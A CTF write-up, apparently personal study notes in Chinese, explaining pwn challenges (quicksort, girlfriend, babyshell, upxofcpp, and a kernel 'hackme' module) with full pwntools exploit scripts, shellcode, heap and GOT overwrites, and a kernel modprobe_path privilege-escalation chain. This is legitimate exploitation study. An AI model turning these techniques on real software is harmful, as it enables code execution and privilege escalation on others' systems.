## Pwn

### Quick sort

```
// file
quicksort: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a19eef0b6e1b24933c02b5bdaafd25c9fa4b9570, stripped

// checksec
[*] '/tmp/quicksort'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`gets()` 可以控制 stack，hijack pointer 任意寫，並且因為沒有 PIE + partial RELRO，所以可以改寫 `free_got` 避免 `free()` 的時候 pointer invalid，而透過改寫為 `main()`，在之後印出結果時也可以透過控制 ptr 來 leak libc。而第二次執行 `main()` 時，再用一樣的方式將 `system()` 寫入 `atoi()`，最後輸入 `/bin/sh` 即可 call `system("/bin/sh")`。

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./Q", env={"LD_PRELOAD": "./libc.so.6"}, aslr=False)
r = process("./Q", env={"LD_PRELOAD": "./libc.so.6"})
# gdb.attach(r, """
# # gets
# b *0x8048901

# # scanf
# # b *0x80488bd
# """)

_main = 0x8048816
__stack_chk_fail_got = 0x804a024
_free_got = 0x0804a018
_stderr = 0x804a060
_atoi_got = 0x804a038

r.sendlineafter('how many numbers do you want to sort?', '3')
r.sendlineafter(' number:', str(_main).encode().ljust(0x2c-0x1c, b'\x00') + p32(3) + p32(0)*2 + p32(_free_got))
r.sendlineafter(' number:', str(0).encode().ljust(0x2c-0x1c, b'\x00') + p32(2) + p32(4)*2 + p32(_stderr))

r.recvuntil('Here is the result:\n')
libc = int(r.recvuntil(' ', drop=True)) - 0x1b2cc0
_system = libc + 0x3ada0
info(f"libc: {hex(libc)}")
info(f"_system: {hex(_system)}")

r.sendlineafter('how many numbers do you want to sort?', '3')
r.sendlineafter(' number:', str(_system).encode().ljust(0x2c-0x1c, b'\x00') + p32(3) + p32(0)*2 + p32(_atoi_got))
r.sendlineafter('the 2th number:', '/bin/sh')

r.interactive()
```



- 主要 bypass canary 的方式有 3 種
  - leak canary
  - 直接 edit return address
  - overwrite `__stack_chk_fail`



### girlfriend

```
// file
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e9b944287c56358a36334280ccb71ab0ab12ac3b, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn-girlfriend/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

glibc 2.29，tcache 已經加上 key 的保護。

可以 double free，但是沒辦法 edit，因此只能用在 fastbin，以下為 `malloc_hook` 寫 `realloc`，`realloc_hook` 寫 oneshot 版本的 exploit，但是因為條件不合沒辦法使用:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"}, aslr=False)
r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"})
gdb.attach(r, """
dir /usr/src/glibc/glibc-2.27/:dir /usr/src/glibc/glibc-2.27/malloc/
b *exec_comm+1761
""")

"""
1.Add a girl's info
2.Show info
3.Edit info
4.Call that girl!
5.Exit lonely.
"""

def add(s, name, call):
    r.sendlineafter('Input your choice:', '1')
    r.sendlineafter('Please input the size of girl\'s name\n', str(s))
    r.sendafter('please inpute her name:\n', name)
    r.sendafter('please input her call:\n', call)

def show_info(idx):
    r.sendlineafter('Input your choice:', '2')
    r.sendlineafter('Please input the index:\n', str(idx))

def call(idx):
    r.sendlineafter('Input your choice:', '4')
    r.recvuntil('Be brave,speak out your love!\n')
    r.sendlineafter('Please input the index:\n', str(idx))
        
add(0x410, "A", "A") # 0
add(0x60, "B", "B") # 1, prevent consolidate
call(0)
show_info(0) # leak libc
r.recvuntil('name:\n')
libc = u64(r.recvuntil('phone:', drop=True).ljust(8, b'\x00')) - 0x3b1ca0
libc &= 0xffffffffffff
oneshot = libc + 0xdf991 # 0xc224f, 0xdf991, 0xdf99d
__malloc_hook = libc + 0x3b1c30
__libc_realloc = libc + 0x80ef0
target = __malloc_hook - 0x13
info(f"libc: {hex(libc)}")

for i in range(2, 10): # 2 - 9
    add(0x60, f"{i}", f"{i}")

call(1)
for i in range(2, 8):
    call(i)

call(8)
call(9)
call(8)

for i in range(10, 17): # 10 - 16
    add(0x60, f"{i}", f"{i}")

add(0x60, p64(target), 'C')
add(0x60, 'D', 'D')
add(0x60, 'E', 'E')
add(0x60, b'\xff'*0xb + p64(oneshot) + p64(__libc_realloc), 'F')
r.sendlineafter('Input your choice:', '1')

r.interactive()
```



再來是 `free_hook()` 比較保險的版本，原本以為 `__free_hook` 上下都是 0，沒辦法透過 `malloc()` 拿到正確的位置，不過在 `_IO_stdfile_0_lock+8`，也就是 `free_hook` 上方剛好有一個 libc address，`0x7f` 的開頭可以利用，而 [[House Of Roman](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#introduction)](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc) 是利用 unsorted bin attack 來在 `free_hook` 上方寫 libc address。不過如果 tcache 已經被清空，而 fastbin 還有 chunk 的情況下，fastbin 的 chunk 會被丟回去 tcache，也因此避免掉 chunk size 的限制，以下為該段程式碼

```c
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd;
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
#endif
```



而最後的 exploit 如下:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"}, aslr=False)
r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"})
gdb.attach(r, """
dir /usr/src/glibc/glibc-2.27/:dir /usr/src/glibc/glibc-2.27/malloc/
b *exec_comm+1761
""")

"""
1.Add a girl's info
2.Show info
3.Edit info
4.Call that girl!
5.Exit lonely.
"""

def add(s, name, call):
    r.sendlineafter('Input your choice:', '1')
    r.sendlineafter('Please input the size of girl\'s name\n', str(s))
    r.sendafter('please inpute her name:\n', name)
    r.sendafter('please input her call:\n', call)

def show_info(idx):
    r.sendlineafter('Input your choice:', '2')
    r.sendlineafter('Please input the index:\n', str(idx))

def call(idx):
    r.sendlineafter('Input your choice:', '4')
    r.recvuntil('Be brave,speak out your love!\n')
    r.sendlineafter('Please input the index:\n', str(idx))
        
add(0x410, "A", "A") # 0
add(0x60, "B", "B") # 1, prevent consolidate
call(0)
show_info(0) # leak libc
r.recvuntil('name:\n')
libc = u64(r.recvuntil('phone:', drop=True).ljust(8, b'\x00')) - 0x3b1ca0
libc &= 0xffffffffffff
__free_hook = libc + 0x3b38c8
_system = libc + 0x41c30
info(f"libc: {hex(libc)}")

for i in range(2, 10): # 2 - 9
    add(0x60, f"{i}", f"{i}")

call(1)
for i in range(2, 8):
    call(i)

call(8)
call(9)
call(8)

for i in range(10, 17): # 10 - 16
    add(0x60, f"{i}", f"{i}")

add(0x60, p64(__free_hook), 'C') # 17
add(0x60, 'D', 'D') # 18
add(0x60, '/bin/sh\x00', 'E') # 19
add(0x60, p64(_system), 'F')
call(19)

r.interactive()
```



### baby shell

```
// file
starctf_2019_babyshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1823c3a487a33936129f5630bc72aae96a129ca8, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/babyshell/starctf_2019_babyshell'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

第一個 shellcode 需要為 null，而使用 `add XXX` instruction 就可以繞過，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./babyshell')
gdb.attach(r, """
b *0x4008cb
""")

ptr = 0x601060
# add byte ptr [rax+0x601060], ah
sc = b'\x00\xa0`\x10`\x00'
sc += asm("""
mov rax, 0x68732f6e69622f
push rax
mov rax, 0x3b
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
""")
r.sendafter('give me shellcode, plz:\n', sc)

r.interactive()
```



### upxofcpp

```
// file
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=086b20bf8a2c24df642c0642bd3aa5999f90dd7d, stripped

// checksec
[!] Did not find any GOT entries
[*] '/home/u1f383/tmp/pwn/pwn-upxofcpp/upxofcpp'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    Packer:   Packed with UPX
```

可以發現 check 顯示的 `Packer` 為 UPX，而 UPX 有提供 unpack 的功能 `upx -d <binary>`，解完後的到原真正的 binary:

```
// checksec
[*] '/home/u1f383/tmp/pwn/pwn-upxofcpp/upxofcpp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

pseudo code:

```c++
banner();

while (true) {
	cout << "1. Add a vec" << endl;
    cout << "2. Remove a vec" << endl;
    cout << "3. Edit a vec" << endl;
    cout << "4. Show a vec" << endl;
    cout << "Your choice:" << endl;
    cin >> choice;

    switch (choice): {
        case 1:
            add_1420();
            break;
        case 2:
            remove_1670();
            break;
        case 3:
            edit_1730(); // not implement
            break;
        case 4:
            show_17F0();
            break;
        default:
            cout << "bye bye" << endl;
            return 0;
    }   
}

void add_1420() {
    cout << "Index:";
    cin >> idx;
    
    if (idx > 0xf || vec_list[idx]) {
        return;
    }
    cout << "Size:";
    cin >> size;
    if (size > 0x10000) return;
    
    // Vec {remove_func_list, memory, size}
    Vec vec = new Vec{off_202db8, malloc(4*size), size};
    idx = 0;
    while (idx < vec->size) {
        cin >> integer;
        *(vec->memory + idx*4) = integer;
        idx++;
    }
    
    vec_list[vec_cnt++] = vec;
}

void remove_1670() {
    cout << "vec index:";
    cin >> idx;
    if (idx > 0xf || !vec_list[idx]) {
        cout << "Invalid vec index!" << endl;
    } else {
        func_ptr = *(*vec_list[idx]->remove_func_list + 1);
        if (func_ptr == 0x1dd0) {
            func_ptr(vec_list[idx]->memory);
        } else {
            func_ptr(vec_list[idx]); // not clear ptr
        }
    }
}

void show_17f0() {
    cout << "vec index:";
    cin >> idx;
    if (idx > 0xf || !vec_list[idx]) {
        cout << "Invalid vec index!" << endl;
    } else {
        func_ptr = *(*vec_list[idx] + 0x10);
        if (func_ptr == 0x1e20) {
			cout << "No leakage! :P" << endl;
        } else {
            func_ptr();
        }
    }
}
```



特定版本 + 特定作業系統的 UPX 會讓 heap 變得**可執行 (no NX)**，但是我 local 實際執行 heap 並不會可執行 (環境必須要是 ubuntu16.04 + upx 3.92，參考 [issue](https://github.com/upx/upx/issues/81))。此題參考 [balsn 的 writeup](https://balsn.tw/ctf_writeup/20190427-*ctf/#upxofcpp)，原本有發現 **double free 的問題**，但是沒辦法好好地控制 function table，而 balsn 的解法是透過 function table 以 fastbin 的 fd 一步步找到 function code，而 function pointer 最後會指向第一個 chunk 的末 8 bytes，就可以執行 shellcode:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./U', env={"LD_PRELOAD": "./libc-2.23.so"})
r = process('./U', env={"LD_PRELOAD": "./libc-2.23.so"}, aslr=False)
# r = remote('localhost', 9999)
# gdb.attach(r, """
# # remove_1670
# # b *0x5555555556d0
# # b *0x5555555556c0
# # b *0x555555769c50
# """)

def add(idx, size):
    r.sendlineafter('choice:', '1')
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Size:', str(size))

def show(idx):
    r.sendlineafter('choice:', '4')
    r.sendlineafter('index:', str(idx))

def remove(idx):
    r.sendlineafter('choice:', '2')
    r.sendlineafter('index:', str(idx))

info(f"heap_from: {hex(0x555555769c10)}")

payload = asm("xchg rsi, rax ; push rax ; pop rdi ; syscall").ljust(8, b'\x00')
print(payload)
print(hex((u32(payload[:4]))))
print(hex((u32(payload[4:]))))

add(3, 6)
for _ in range(4):
    r.sendline(str(0x33333333))
r.sendline(str(u32(payload[:4])))
r.sendline(str(u32(payload[4:])))

add(0, 10)
for _ in range(10):
    r.sendline(str(0x44444444))

add(1, 10)
for _ in range(10):
    r.sendline(str(0x55555555))

add(2, 10)
for _ in range(10):
    r.sendline(str(0x66666666))

remove(0)
remove(1)
remove(2)
input()
show('2')

sleep(1)
r.send(b'\x90'*0x10 + asm(shellcraft.sh()))

r.interactive()
```



- asm 中，jmp instruction 的寫法為 `jmp .+0x10`

- fastbin consolidate 會由 `malloc_consolidate()` 來完成，call `malloc_consolidate()` 有一些條件 (glibc 2.31):

- 1. large bin request 時

     ```c
     // _int_malloc()
        /*
          If this is a large request, consolidate fastbins before continuing.
          While it might look excessive to kill all fastbins before
          even seeing if there is space available, this avoids
          fragmentation problems normally associated with fastbins.
          Also, in practice, programs tend to have runs of either small or
          large requests, but less often mixtures, so consolidation is not
          invoked all that often in most programs. And the programs that
          it is called frequently in otherwise tend to fragment.
        */
     
       else
         {
           idx = largebin_index (nb);
           if (atomic_load_relaxed (&av->have_fastchunks))
             malloc_consolidate (av);
         }
     ```

  2. atomic ops

     ```c
     // _int_malloc()
     	/* When we are using atomic ops to free fast chunks we can get
              here for all block sizes.  */
           else if (atomic_load_relaxed (&av->have_fastchunks))
             {
               malloc_consolidate (av);
               /* restore original bin index */
               if (in_smallbin_range (nb))
                 idx = smallbin_index (nb);
               else
                 idx = largebin_index (nb);
             }
     ```

  3. fastbin threshold

     ```c
     // _int_free()
     	/*
           If freeing a large space, consolidate possibly-surrounding
           chunks. Then, if the total unused topmost memory exceeds trim
           threshold, ask malloc_trim to reduce top.
     
           Unless max_fast is 0, we don't know if there are fastbins
           bordering top, so we cannot tell for sure whether threshold
           has been reached unless fastbins are consolidated.  But we
           don't want to consolidate on each free.  As a compromise,
           consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
           is reached.
         */
     
         if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
           if (atomic_load_relaxed (&av->have_fastchunks))
     	malloc_consolidate(av);
     
      /*
        FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()
        that triggers automatic consolidation of possibly-surrounding
        fastbin chunks. This is a heuristic, so the exact value should not
        matter too much. It is defined at half the default trim threshold as a
        compromise heuristic to only attempt consolidation if it is likely
        to lead to trimming. However, it is not dynamically tunable, since
        consolidation reduces fragmentation surrounding large chunks even
        if trimming is not used.
      */
     #define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)
     ```



### pwn-hackme

start.vm.sh

```bash
#! /bin/sh
qemu-system-x86_64 \
    -m 256M \
    -nographic \
    -kernel bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
    -monitor /dev/null \
    -initrd initramfs.cpio \
    -smp cores=4,threads=2 \
    -cpu qemu64,smep,smap 2>/dev/null
```

透過 user 傳入的 `Operation`，在 kernel 中 `create`、`read`、`write`、`delete` pool entry，而 `Operation` 的結構如下:

```c
typedef struct _Operation {
    unsigned int index;
    unsigned int unused;
    char *buf;
    long int size;
    long int off;
} Operation;
```

然而在 kernel module 在做 `read` 與 `write` 的時候，對 `size` 以及 `off` 的檢查如下:

```c
// write
      if ( v8_buf && v17_ope.off + v17_ope.size <= (unsigned __int64)v9_entry_addr->size )
      {
        copy_from_user(&v8_buf[v17_ope.off], v17_ope.buffer, v17_ope.size);
        return 0LL;
      }

// read
        if ( v17_ope.off + v17_ope.size <= (unsigned __int64)v5->size )
        {
          copy_to_user(v17_ope.buffer, &v4[v17_ope.off], v17_ope.size);
          return 0LL;
        }
```

並沒有檢查 `off` 以及 `size` 的型態應該要是 `unsigned long int`，因此如果 `off` 為負數，就可以往回讀取資料。

而在 `kmalloc()` 時使用的 flag 如下:

```c
v16_buffer = _kmalloc(v17_ope.size, 0x6000C0LL);
// (___GFP_IO | ___GFP_FS | ___GFP_ACCOUNT | ___GFP_THISNODE)
// ___GFP_THISNODE: Allocate node-local memory only

// /linux/gfp.h
// flag
/* Plain integer GFP bitmasks. Do not use this directly. */
#define ___GFP_DMA		0x01u
#define ___GFP_HIGHMEM		0x02u
#define ___GFP_DMA32		0x04u
#define ___GFP_MOVABLE		0x08u
#define ___GFP_RECLAIMABLE	0x10u
#define ___GFP_HIGH		0x20u
#define ___GFP_IO		0x40u
#define ___GFP_FS		0x80u
#define ___GFP_ZERO		0x100u
#define ___GFP_ATOMIC		0x200u
#define ___GFP_DIRECT_RECLAIM	0x400u
#define ___GFP_KSWAPD_RECLAIM	0x800u
#define ___GFP_WRITE		0x1000u
#define ___GFP_NOWARN		0x2000u
#define ___GFP_RETRY_MAYFAIL	0x4000u
#define ___GFP_NOFAIL		0x8000u
#define ___GFP_NORETRY		0x10000u
#define ___GFP_MEMALLOC		0x20000u
#define ___GFP_COMP		0x40000u
#define ___GFP_NOMEMALLOC	0x80000u
#define ___GFP_HARDWALL		0x100000u
#define ___GFP_THISNODE		0x200000u
#define ___GFP_ACCOUNT		0x400000u
#ifdef CONFIG_LOCKDEP
#define ___GFP_NOLOCKDEP	0x800000u
#else
#define ___GFP_NOLOCKDEP	0
#endif

#define __GFP_DMA	((__force gfp_t)___GFP_DMA)
#define __GFP_HIGHMEM	((__force gfp_t)___GFP_HIGHMEM)
#define __GFP_DMA32	((__force gfp_t)___GFP_DMA32)
#define __GFP_MOVABLE	((__force gfp_t)___GFP_MOVABLE)  /* ZONE_MOVABLE allowed */
#define GFP_ZONEMASK	(__GFP_DMA|__GFP_HIGHMEM|__GFP_DMA32|__GFP_MOVABLE)

#define __GFP_RECLAIMABLE ((__force gfp_t)___GFP_RECLAIMABLE)
#define __GFP_WRITE	((__force gfp_t)___GFP_WRITE)
#define __GFP_HARDWALL   ((__force gfp_t)___GFP_HARDWALL)
#define __GFP_THISNODE	((__force gfp_t)___GFP_THISNODE)
#define __GFP_ACCOUNT	((__force gfp_t)___GFP_ACCOUNT)

// user interface
#define GFP_ATOMIC	(__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM)
#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)
#define GFP_KERNEL_ACCOUNT (GFP_KERNEL | __GFP_ACCOUNT)
#define GFP_NOWAIT	(__GFP_KSWAPD_RECLAIM)
#define GFP_NOIO	(__GFP_RECLAIM)
#define GFP_NOFS	(__GFP_RECLAIM | __GFP_IO)
#define GFP_USER	(__GFP_RECLAIM | __GFP_IO | __GFP_FS | __GFP_HARDWALL)
#define GFP_DMA		__GFP_DMA
#define GFP_DMA32	__GFP_DMA32
#define GFP_HIGHUSER	(GFP_USER | __GFP_HIGHMEM)
#define GFP_HIGHUSER_MOVABLE	(GFP_HIGHUSER | __GFP_MOVABLE)
#define GFP_TRANSHUGE_LIGHT	((GFP_HIGHUSER_MOVABLE | __GFP_COMP | \
			 __GFP_NOMEMALLOC | __GFP_NOWARN) & ~__GFP_RECLAIM)
#define GFP_TRANSHUGE	(GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM)
```

而後要透過 `read` + negative offset 來 leak kernel，首先 create 5 個 chunk:

```c
    create_entry(0, payload, 0x100);
    create_entry(1, payload, 0x100);
    create_entry(2, payload, 0x100);
    create_entry(3, payload, 0x100);
    create_entry(4, payload, 0x100);
    remove_entry(1);
    remove_entry(3); // ptr->fd = chunk_1
```

heap address 必須透過 chunk 的 fd 來 leak，不過如果相鄰的 chunk 都是 freed，chunk 會受到 consolidate 的影響，因此建立 5 個 chunk + remove chunk 1 跟 chunk3，就可以透過 chunk 4 來 leak chunk 3 指向 chunk 1 的 fd pointer。

而 kernel address 可以透過 chunk 0 讀取 heap 上的 data，因為 kernel 其他的 data 可能會在 heap 上殘留 kernel address，到這邊 kernel 跟 heap 都有了:

```c
    read_data(4, (char *)buf, 0x100, -0x100); // leak heap
    heap = *(ptr);

    read_data(0, (char *)buf, 0x100, -0x100); // leak kernel
    kernel = *(ptr+5);
```

之後要 leak kernel module，並且改 pool table，而先在 pwndbg 看有哪些地方有 kernel module 的 address:

```bash
# 先看已知的 address 處在哪個 mapping region，確保 addr base 相同
pwndbg> xinfo 0xffffffff81849ae0
Extended information for virtual address 0xffffffff81849ae0:

  Containing mapping:
0xffffffff81459000 0xffffffff81c00000 rwxp   7a7000 0      <explored>

# 再從該 region 中找 kernel module 的 address
pwndbg> find 0xffffffff81459000, 0xffffffff81c00000, 0xffffffffc000
0xffffffff81811012
0xffffffff81811022
0xffffffff818403ea
0xffffffff8184713a
0xffffffff81919a92
# 以上 address 即是透過 leaked address 加上 offset 可以得到存放 kernel module address 的 address
```

在 kernel 中，只要能改動 chunk fd，就能拿到任意位置，並且不會有 size header 的限制，因此再次利用 chunk 4 去更改 chunk 3 的 fd 為 `0xffffffff81811010 + 0x30`，+ 0x30 的原因為很明顯在 `0xffffffff81811010` 會有類似 data struct 的資料，而 + 0x30 的位置看起來是 memory map (`main_arena` 的感覺)，對於 memory map entry 的 fd 與 bk 都是指向自己，並且看起來沒用到，因此分配這塊 memory chunk 時不會影響到 kernel 的運作，只要再透過 `read_data()` 即可拿到 -0x30 offset 的 module base。

```c
    unsigned long table_ptr = kernel - 0x38ad0;
    memset(buf, 0, 0x200); // clear buffer
    *ptr = table_ptr + 0x30;

    write_data(4, (char *)buf, 0x100, -0x100);
    create_entry(5, zeros, 0x100);
    create_entry(6, zeros, 0x100);
    read_data(6, (char *)buf, 0x30, -0x30);
    unsigned long module = *(ptr+1);
	unsigned long modprobe_path = kernel - 0xa180;
```

有 kernel, heap, module，下一步要想辦法改寫 pool，使得我們可以多次寫入，寫 `modprobe_path`，而方式還是透過改寫 fd 拿到任意 chunk:

```c
    // remove all entry except 0, 6
    remove_entry(2);
    remove_entry(4);
    remove_entry(5);

    create_entry(1, zeros, 0x100); // 0x700
    create_entry(2, zeros, 0x100); // 0x800
    create_entry(3, zeros, 0x100); // 0x600

    remove_entry(3); // 0x600
    remove_entry(2); // 0x800
    // 0x800 has a fd point to 0x600
    // 0x600 fd point --> 0xffffffff81811040
    
    memset(buf, 0, 0x200); // clear buffer
    *ptr = modprobe_path;
    write_data(1, (char *)buf, 0x100, -0x100);

    create_entry(2, zeros, 0x100);
    create_entry(3, zeros, 0x100);

    memset(buf, 0, 0x200); // clear buffer
    create_entry(4, "/home/pwn/copy.sh\x00", 0x100);
    system("/home/pwn/dummy");
    system("cat /home/pwn/flag");

    close(dev_fd);
```

並在 `main()` 一開始先建立 modprobe path 所需要的檔案:

```c
    puts("[*] create modprobe path file");
    system("echo -ne '#!/bin/sh\ncp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod 777 /home/pwn/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
    system("chmod 777 /home/pwn/dummy");
```

然而，這樣會因為 kernel heap 的結構亂掉，導致 `execve` 執行時會出現 kernel panic，因此必須把 kernel heap 給修好，所以要先拿到 pool table region，透過改寫 pointer，同時修復 heap 以及改寫 `modprobe_path`，不過不確定是否因為 kernel heap 只有一個指向 `modprobe_path` 的 chunk (`buf` 裡面都是 0)，所以讓 heap 不會受影響 (?):

```c
    memset(buf, 0, 0x200); // clear buffer
    ptr[0] = modprobe_path;
    ptr[1] = 0x100;
    create_entry(4, buf, 0x100);
    write_data(1, "/home/pwn/copy.sh\x00", 0x18, 0);
    system("/home/pwn/dummy");
    system("cat /home/pwn/flag");

    close(dev_fd);
```

成功拿到 flag:

```shell
// output
/home/pwn/dummy: line 1: ����: not found
*CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}
```

- [參考文章](https://kileak.github.io/ctf/2019/xctf-hackme/)
- 之後會想看其他解法如:
  - [tty_struct](https://balsn.tw/ctf_writeup/20190427-*ctf/#hack_me)
  - [userfault_fd](http://brieflyx.me/2020/linux-tools/userfaultfd-internals/)

P.S. 作者說題目出爛了，應該要有 index boundary checking 的，所以有 hackme_revenge